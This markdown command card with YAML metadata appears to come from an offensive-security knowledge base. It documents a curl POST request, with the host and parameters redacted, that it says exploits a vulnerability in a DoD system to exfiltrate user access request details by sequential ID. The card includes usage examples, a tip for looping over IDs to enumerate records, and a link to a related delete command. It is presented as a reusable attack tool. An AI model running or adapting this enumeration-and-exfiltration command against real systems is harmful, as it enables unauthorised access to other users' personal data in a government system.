---
id: cmd-uuid-exfil
data: >-
  curl https://██████/██████████ -X POST -data="url=%2F████&██████████=████████"
  -k
tags:
  - exfiltration
  - verification
type: command
output: Exfiltrated request data if present; empty body if deleted
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:28:59.058Z'
verified: false
validated: true
submitted: true
---
# exfiltrate-access-request

## Command

```bash
curl https://██████/██████████ -X POST -data="url=%2F████&██████████=████████" -k
```

## Description

This command exploits a related vulnerability in the DoD system to exfiltrate user access request details from the database using the provided sequential ID, useful for verifying request creation or deletion.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | Encoded path (%2F████) targeting the exfiltration endpoint | Yes |
| ██████████ | The sequential request ID to query | Yes |
| -k | Ignore SSL certificate errors | No |

## Examples

### Basic Usage

```bash
curl https://██████/██████████ -X POST -data="url=%2F████&██████████=12345" -k
```

### Advanced Usage

For scripted verification, wrap in a loop to check multiple IDs, but replace ID dynamically.

```bash
ID=12345; curl https://██████/██████████ -X POST -data="url=%2F████&██████████=$ID" -k
```

## Expected Output

If the request exists: JSON or HTML with details like user name, access type, timestamp. If deleted or invalid: Empty body or 404-like error.

## Related

- [[commands/delete-access-request]]
- [[procedures/Verify-Access-Request-Existence]]
